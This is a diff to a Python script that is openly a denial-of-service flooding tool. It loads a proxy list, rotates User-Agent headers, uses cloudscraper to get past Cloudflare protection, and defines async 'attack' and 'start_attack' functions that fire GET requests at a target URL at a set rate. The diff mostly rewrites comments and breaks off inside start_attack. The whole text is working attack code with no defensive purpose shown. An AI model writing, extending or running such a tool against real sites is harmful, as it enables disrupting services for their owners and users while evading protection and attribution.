@@ -3,7 +3,7 @@ import aiohttp
 import random
 import cloudscraper
 
-# Load proxies
+# ✅ Load Proxies from File
 def load_proxies():
     try:
         with open("proxies.txt", "r") as f:
@@ -11,31 +11,32 @@ def load_proxies():
     except FileNotFoundError:
         return []
 
-# User-Agent List
+# ✅ User-Agent List for Rotation
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (X11; Linux x86_64)"
 ]
 
-# Cloudflare Bypass
+# ✅ Create Cloudflare Scraper (Bypass Protection)
 def create_scraper():
     return cloudscraper.create_scraper()
 
-# Main Attack Function
+# ✅ Attack Function (Uses Proxies & User-Agent Rotation)
 async def attack(url, session, proxies):
     proxy = random.choice(proxies) if proxies else None
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
         "Referer": url
     }
+    
     try:
         async with session.get(url, headers=headers, proxy=proxy) as response:
-            print(f"🔥 Attack Sent! Status: {response.status}")
+            print(f"🔥 Attack Sent! Status: {response.status} via {proxy}")
     except Exception as e:
         print(f"❌ Request Failed: {e}")
 
-# Start Attack
+# ✅ Start Attack (Multi-threaded)
 async def start_attack(url, requests_per_second, total_requests):
     proxies = load_proxies()
     async with aiohttp.ClientSession() as session:
